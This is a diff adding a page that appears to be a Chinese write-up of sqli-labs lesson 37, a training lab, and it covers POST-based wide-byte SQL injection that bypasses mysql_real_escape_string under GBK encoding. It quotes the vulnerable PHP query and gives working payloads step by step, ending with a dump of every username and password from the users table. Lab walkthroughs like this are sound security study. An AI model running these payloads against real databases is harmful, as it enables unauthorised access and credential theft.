@@ -1,0 +1,28 @@
+<hr>
+<h2 id="title-less37url-https-www-yuque-com-u29002979-ep2zrx-igsfnpppkch9092m"><a href="#title-less37url-https-www-yuque-com-u29002979-ep2zrx-igsfnpppkch9092m" class="headerlink" title="title: less37url: https://www.yuque.com/u29002979/ep2zrx/igsfnpppkch9092m"></a>title: less37<br>url: <a href="https://www.yuque.com/u29002979/ep2zrx/igsfnpppkch9092m">https://www.yuque.com/u29002979/ep2zrx/igsfnpppkch9092m</a></h2><pre><code class="bash">$uname = mysql_real_escape_string($uname1);
+$passwd= mysql_real_escape_string($passwd1);
+
+mysql_query(&quot;SET NAMES gbk&quot;);
+@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;
+</code></pre>
+<blockquote>
+<p>mysql_real_escape_string</p>
+</blockquote>
+<p>post型的宽字节注入 <a name="gLILH"></a></p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p><a name="izUqu"></a></p>
+<h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p><code>uname=**汉&#39;** order by 3--+  </code><br>2个字段 <a name="B0iQ5"></a></p>
+<h2 id="回显点检查"><a href="#回显点检查" class="headerlink" title="回显点检查"></a>回显点检查</h2><p><code>uname=汉&#39; union select 1,2--+</code> <a name="kzUVz"></a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主要看用户,数据库版本&amp;#x20;<br><code>uname=汉&#39; union select user(),version()--+</code>\ <a name="kzVJM"></a></p>
+<h2 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h2><pre><code class="bash">爆破数据库名称
+uname=汉&#39; union select 1,database()--+
+
+爆破数据库表名称
+uname=汉&#39; union select 1,group_concat(table_name)from information_schema.tables where table_schema=database()--+
+
+爆破字段名称
+users的16进制是0x7573657273
+uname=汉&#39; union select 1,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273--+
+
+爆破字段内容
+uname=汉&#39; union select 1,(select group_concat(username,0x7e,password) from users)--+
+</code></pre>
